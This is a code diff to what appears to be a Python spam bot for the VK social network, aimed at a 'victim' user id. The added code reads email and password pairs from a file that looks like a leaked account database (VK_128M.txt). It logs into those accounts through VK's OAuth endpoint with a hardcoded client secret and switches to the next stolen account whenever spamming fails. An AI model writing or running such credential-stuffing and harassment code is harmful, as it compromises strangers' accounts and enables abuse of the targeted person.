@@ -27,6 +27,10 @@ auth_data = {}
 # Сообщения, которые будет отправлять спаммер
 messages = []
 
+database_file = None
+database_line = 0
+current_pair = []
+
 if os.path.exists(SPAMMER_PATH + "messages.txt"):
 	with open(SPAMMER_PATH + "messages.txt") as f:
 		for line in f:
@@ -39,6 +43,12 @@ else:
 	    "fuck",
 	    "5"
 	]
+
+# Создаём указатель на файл с БД аккаунтов
+if os.path.exists(SPAMMER_PATH + "VK_128M.txt"):
+	database_file = open(SPAMMER_PATH + "VK_128M.txt", "rb")
+	database_file.readline()
+
 # -------------------------------------------
 
 def do_save_auth_data():
@@ -56,6 +66,38 @@ def load_auth_data():
 		return True
 	else:
 		return False
+
+def get_next_pair():
+	global database_line
+	global current_pair
+	line = database_file.readline().decode("utf-8")
+
+	line = line.replace("'", "")
+	line = line.replace(" ", "")
+	line = line.split(",")
+
+	email = line[2]
+	passwd = line[3]
+	current_pair = [email, passwd]
+	database_line = database_line + 1
+	print(current_pair)
+
+def auth(username, passwd):
+	global vk
+	url = "https://oauth.vk.com/token?grant_type=password&client_id=3697615&client_secret=AlVXZFMUqyrnABp8ncuU&username=%s&password=%s" % (username, passwd)
+	url = requote_uri(url)
+
+	try:
+		r = urllib.request.urlopen(url)
+	except urllib.error.HTTPError:
+		print("Не удалось залогиниться, возможно вы ввели неправильный пароль")
+		return False
+
+	r = r.read()
+	token = json.loads(r)["access_token"]
+	session = vk.Session(access_token = token)
+	vk = vk.API(session)
+	return True
 	
 class MainThread(threading.Thread):
 	def run(self):
@@ -71,8 +113,15 @@ class MainThread(threading.Thread):
 				print("Sent ", msg)
 				time.sleep(DELAY)
 			except Exception as e:
-				print(e)
-				pass
+				fuck = False
+				try:
+					while(fuck == False):
+						print(e)
+						get_next_pair()
+						print(current_pair)
+						fuck = auth(current_pair[0], current_pair[1])
+				except Exception as e1:
+					print(e1)
 
 def main():
 	try:
@@ -125,19 +174,9 @@ else:
 	print("Got auth data from settings")
 	username = auth_data['username']
 	password = auth_data['password']
-url = "https://oauth.vk.com/token?grant_type=password&client_id=3697615&client_secret=AlVXZFMUqyrnABp8ncuU&username=%s&password=%s" % (username, password)
-url = requote_uri(url)
 
-try:
-    r = urllib.request.urlopen(url)
-except urllib.error.HTTPError:
-    print("Не удалось залогиниться, возможно вы ввели неправильный пароль")
-    quit(1)
 
-r = r.read()
-token = json.loads(r)["access_token"]
-session = vk.Session(access_token = token)
-vk = vk.API(session)
+auth(username, password)
 
 victim = input("User id: ")
 
